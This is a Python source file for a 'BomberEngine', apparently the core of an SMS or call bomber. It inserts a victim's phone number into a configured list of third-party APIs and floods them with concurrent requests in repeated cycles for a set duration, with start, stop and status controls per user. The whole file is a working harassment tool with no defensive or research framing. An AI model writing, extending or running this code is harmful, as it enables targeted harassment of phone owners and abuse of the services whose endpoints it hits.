import asyncio
import aiohttp
import logging
from datetime import datetime, timedelta
from config import API_LIST, BOMB_DURATION, CHECK_INTERVAL

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class BomberEngine:
    def __init__(self):
        self.active_sessions = {}

    async def bomb_single_api(self, api, phone):
        params = api["params"].copy()
        params[api["phone_param"]] = phone
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api["url"], params=params, timeout=15) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        return {"success": True, "api": api["name"]}
                    else:
                        return {"success": False, "api": api["name"], "error": f"Status {resp.status}"}
        except Exception as e:
            return {"success": False, "api": api["name"], "error": str(e)}

    async def continuous_bombing(self, phone, user_id, duration=BOMB_DURATION):
        self.active_sessions[user_id] = {"phone": phone, "start_time": datetime.now(), "active": True}
        
        start_time = datetime.now()
        end_time = start_time + timedelta(seconds=duration)
        cycle_count = 0
        
        logger.info(f"[⚡] Starting bombing for {phone}")
        
        while datetime.now() < end_time and self.active_sessions.get(user_id, {}).get("active", False):
            cycle_count += 1
            tasks = [self.bomb_single_api(api, phone) for api in API_LIST]
            results = await asyncio.gather(*tasks)
            success = sum(1 for r in results if r.get("success"))
            logger.info(f"[🔄] Cycle {cycle_count}: {success} OK")
            
            if not self.active_sessions.get(user_id, {}).get("active", False):
                break
            await asyncio.sleep(CHECK_INTERVAL)
        
        if self.active_sessions.get(user_id, {}).get("active", False):
            self.active_sessions[user_id]["active"] = False
        
        return {"total_cycles": cycle_count, "phone": phone, "duration": duration}

    async def stop_bombing(self, user_id):
        if user_id in self.active_sessions:
            self.active_sessions[user_id]["active"] = False
            return True
        return False

    def get_status(self, user_id):
        if user_id in self.active_sessions:
            session = self.active_sessions[user_id]
            if session.get("active", False):
                elapsed = (datetime.now() - session["start_time"]).seconds
                remaining = max(0, BOMB_DURATION - elapsed)
                return {"active": True, "phone": session["phone"], "remaining": remaining}
        return {"active": False}

bomber = BomberEngine()
